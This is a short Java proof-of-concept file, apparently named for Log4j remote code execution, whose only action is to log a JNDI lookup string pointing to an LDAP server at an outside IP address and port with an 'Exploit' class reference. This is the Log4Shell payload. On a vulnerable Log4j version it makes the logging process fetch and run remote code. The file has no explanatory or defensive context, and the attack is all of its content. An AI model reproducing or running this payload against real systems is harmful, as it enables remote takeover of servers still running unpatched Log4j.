import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4jrce {
    private static final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        logger.error("${jndi:ldap://106.54.86.119:7777/#Exploit}");
    }
}
